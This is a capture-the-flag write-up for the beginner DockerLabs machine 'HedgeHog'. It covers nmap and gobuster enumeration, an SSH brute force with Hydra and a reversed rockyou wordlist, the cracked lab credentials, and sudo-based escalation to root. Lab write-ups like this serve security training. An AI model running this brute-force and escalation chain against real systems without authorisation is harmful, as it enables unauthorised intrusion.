# 🦔 HedgeHog | DockerLabs [WriteUp]

## Information

* Machine: HedgeHog
* Difficulty: Very Easy
* IP: 172.17.0.2

---

# 🔎 Enumeration

## 📡 Ping

```bash
ping -c 1 172.17.0.2
```

Result:

<img width="492" height="145" alt="image" src="https://github.com/user-attachments/assets/57705930-0c49-4e7c-9503-00a0d906626c" />


The `TTL=64` strongly suggests that the target machine is running Linux.

---

# 🚪 Port Scanning

## 🧭 Full Port Scan

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

Result:

<img width="540" height="221" alt="image" src="https://github.com/user-attachments/assets/6ef85d72-61f4-4b42-a7b5-e850255bc14d" />


Open ports discovered:

* `22/tcp` → SSH
* `80/tcp` → HTTP

---

## 🛠️ Service Detection

```bash
sudo nmap -sCV -p22 172.17.0.2
```

Result:

<img width="764" height="272" alt="image" src="https://github.com/user-attachments/assets/64d1cca0-0c4e-47a2-8df7-c76b7cad7c2d" />

The target is running OpenSSH 9.6p1 on Ubuntu.

---

# 🌐 Web Enumeration

## 🕵️ Fingerprinting

```bash
whatweb http://172.17.0.2
```

Result:

<img width="939" height="77" alt="image" src="https://github.com/user-attachments/assets/70bba477-bebd-422e-a67f-925f486f09ff" />


The web server is running Apache 2.4.58 on Ubuntu.

---

## 📄 Main Website Content

```bash
curl -s http://172.17.0.2
```

Result:

<img width="383" height="69" alt="image" src="https://github.com/user-attachments/assets/05dce603-062a-48dc-a7ba-31b44b4d10ab" />


The website only returned the word:

```text
tails
```

This was likely:

* a valid username
* a password
* or a clue related to SSH access

---

## 📂 Directory Fuzzing

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,html -t 20
```

Result:

<img width="939" height="417" alt="image" src="https://github.com/user-attachments/assets/20d852dc-4aff-497d-8cbb-8aa8dc4e5c47" />


No additional interesting directories were discovered.

---

# 🔐 SSH Brute Force

Since the only clue discovered on the website was the word `tails`, SSH brute force became the primary attack vector.

To optimize the attack, the `rockyou.txt` wordlist was reversed so Hydra could start testing passwords from the end of the file.

---

## 🔄 Reverse rockyou.txt

```bash
tac /usr/share/wordlists/rockyou.txt > rockyou_reversed.txt
```

---

## 🧹 Remove Spaces From Wordlist

```bash
cat rockyou_reversed.txt | sed 's/ //g' rockyou_reversed.txt > temp.txt && mv temp.txt rockyou_reversed.txt
```

---

## ⚡ Hydra Attack

```bash
hydra -l tails -P rockyou_reversed.txt ssh://172.17.0.2 -t 64
```

Result:

<img width="946" height="367" alt="image" src="https://github.com/user-attachments/assets/6283dccf-8d21-45de-ade4-46527ac44d6f" />


Valid credentials discovered:

| Username | Password   |
| -------- | ---------- |
| tails    | 3117548331 |

---

# 💻 Initial Access

## 🔑 SSH Login

```bash
ssh tails@172.17.0.2
```

Password:

```text
3117548331
```

Result:

<img width="601" height="263" alt="image" src="https://github.com/user-attachments/assets/d6f8cf5e-b0c2-4fcd-a606-8be4a78a107f" />

---

## ✅ Initial Validation

```bash
whoami && id && hostname
```

Result:

<img width="420" height="90" alt="image" src="https://github.com/user-attachments/assets/daa8c44b-e4a0-42c2-93c5-95b517878b8f" />


This is a very useful command during CTFs and penetration tests because it quickly displays:

* current user
* groups and privileges
* machine hostname

---

# 🚀 Privilege Escalation

## 🛡️ Checking Sudo Privileges

```bash
sudo -l
```

Result:

<img width="479" height="80" alt="image" src="https://github.com/user-attachments/assets/8f64fbb7-9d14-4fe5-a46b-b423e20cee2e" />


The user `tails` was allowed to execute commands as `sonic` without requiring a password.

---

## 👤 Switching to sonic

```bash
sudo -u sonic /bin/bash
```

Verification:

```bash
whoami && id && hostname
```

Result:

<img width="499" height="112" alt="image" src="https://github.com/user-attachments/assets/b6493333-8cb8-4452-aa4d-57ed51495799" />


The user `sonic` belonged to the `sudo` group.

---

## 👑 Root Privilege Escalation

```bash
sudo su
```

Verification:

```bash
whoami && id && hostname
```

Result:

<img width="469" height="123" alt="image" src="https://github.com/user-attachments/assets/2c3351b3-e8be-42bd-a2d8-8df159abe8bb" />


Root access obtained successfully.

---

# 📌 Conclusion

HedgeHog was a straightforward beginner-friendly machine focused on:

1. Basic enumeration
2. Web clue discovery
3. SSH brute force attacks
4. Sudo privilege abuse
5. Linux privilege escalation

Attack chain summary:

1. Enumerated SSH and HTTP services
2. Discovered the clue `tails` on the website
3. Performed SSH brute force using a reversed rockyou wordlist
4. Logged in as `tails`
5. Escalated horizontally to `sonic`
6. Escalated vertically to `root` using sudo privileges
7. Fully compromised the machine
